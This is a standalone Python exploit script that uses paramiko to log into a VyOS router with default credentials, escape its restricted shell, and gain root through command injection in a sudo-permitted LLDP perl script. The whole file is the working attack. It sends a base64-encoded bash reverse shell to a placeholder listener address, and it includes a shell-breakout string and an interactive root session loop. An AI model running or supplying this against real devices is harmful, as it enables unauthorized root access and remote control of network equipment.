import base64
import paramiko
import time

# User settings
RHOST = '10.10.10.201'
RPORT = 22
USERNAME = 'vyos'
PASSWORD = 'vyos'

# Your payload - here a reverse shell as an example
# Replace with your own payload command if needed
payload_cmd = "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1"

def main():
    # Base64 encode payload to avoid shell escaping issues
    payload_b64 = base64.b64encode(payload_cmd.encode()).decode()

    # Connect SSH
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print(f"[+] Connecting to {RHOST}:{RPORT} as {USERNAME} ...")
    ssh.connect(RHOST, port=RPORT, username=USERNAME, password=PASSWORD, look_for_keys=False, allow_agent=False)
    print("[+] Connected.")

    # Open interactive shell channel
    chan = ssh.invoke_shell()
    time.sleep(1)

    # Receive initial banner and prompt
    output = chan.recv(65535).decode('utf-8').lower()
    print("[*] Initial shell output:")
    print(output)

    if 'vyos' not in output:
        print("[-] Target does not appear to be VyOS.")
        ssh.close()
        return

    if '> ' in output:
        print("[*] Restricted shell detected. Attempting breakout...")
        chan.send("telnet ';/bin/sh'\n")
    elif '$ ' in output:
        print("[*] Unrestricted shell detected.")
        chan.send("/bin/sh\n")
    else:
        print("[-] Unexpected shell prompt. Exiting.")
        ssh.close()
        return

    time.sleep(2)
    output = chan.recv(65535).decode('utf-8')
    print("[*] After breakout attempt:")
    print(output)

    # Build command injection payload
    # The vulnerable sudo perl script command:
    exploit_cmd = f"sudo /opt/vyatta/bin/sudo-users/vyatta-show-lldp.pl -action show-neighbor -i ';echo {payload_b64}|base64 -d|/bin/sh'\n"

    print("[*] Sending privilege escalation payload...")
    chan.send(exploit_cmd)

    # Wait a bit to see if payload runs
    time.sleep(3)

    # Now interact with shell or leave session open
    print("[*] You may now have root shell (try whoami):")

    # Optional: interact manually
    try:
        while True:
            resp = chan.recv(1024).decode('utf-8')
            if resp:
                print(resp, end='')
            cmd = input()
            chan.send(cmd + '\n')
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Exiting.")
    finally:
        ssh.close()

if __name__ == "__main__":
    main()
